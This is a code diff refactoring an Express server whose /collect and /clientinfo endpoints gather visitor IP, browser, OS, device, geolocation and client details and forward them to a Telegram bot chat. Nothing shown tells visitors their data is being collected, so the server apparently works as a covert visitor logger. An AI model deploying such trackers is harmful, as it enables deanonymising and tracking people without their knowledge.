@@ -1,3 +1,4 @@
+// server.js
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
@@ -16,27 +17,31 @@ app.use(requestIp.mw());
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+  console.error('⚠️ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing!');
+  process.exit(1);
+}
+
 app.use(express.static('public'));
 
-const axiosTelegramSend = (text) => {
+const axiosTelegramSend = async (text) => {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  return axios.post(url, {
-    chat_id: TELEGRAM_CHAT_ID,
-    text,
-    parse_mode: 'Markdown'
-  });
+  try {
+    await axios.post(url, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text,
+      parse_mode: 'Markdown'
+    });
+  } catch (error) {
+    console.error('Telegram send error:', error.message);
+  }
 };
 
 app.get('/collect', async (req, res) => {
-  // твой текущий код, возвращающий базовые данные
   let ip = req.clientIp || '';
   if (req.headers['x-forwarded-for']) {
-    const parts = req.headers['x-forwarded-for'].split(',').map(s => s.trim());
-    if (parts.length > 0 && parts[0]) {
-      ip = parts[0];
-    }
+    ip = req.headers['x-forwarded-for'].split(',')[0].trim();
   }
-
   const ua = req.useragent || {};
   const browser = ua.browser || 'Unknown';
   const os = ua.os || 'Unknown';
@@ -55,17 +60,7 @@ app.get('/collect', async (req, res) => {
     console.error('Geo API error:', err.message);
   }
 
-  const isVpn = false;
-
-  res.json({
-    ip,
-    browser,
-    os,
-    device,
-    country,
-    city,
-    vpn: isVpn
-  });
+  res.json({ ip, browser, os, device, country, city, vpn: false });
 });
 
 app.post('/clientinfo', async (req, res) => {
@@ -91,10 +86,9 @@ Cookies Enabled: ${cookies}
 VPN: ${vpn ? 'Yes' : 'No'}`;
 
     await axiosTelegramSend(message);
-
-    res.json({ success: true, message: 'Info sent to Telegram' });
+    res.json({ success: true });
   } catch (error) {
-    console.error('Error in /clientinfo:', error);
+    console.error('Error /clientinfo:', error);
     res.status(500).json({ success: false, error: error.message });
   }
 });
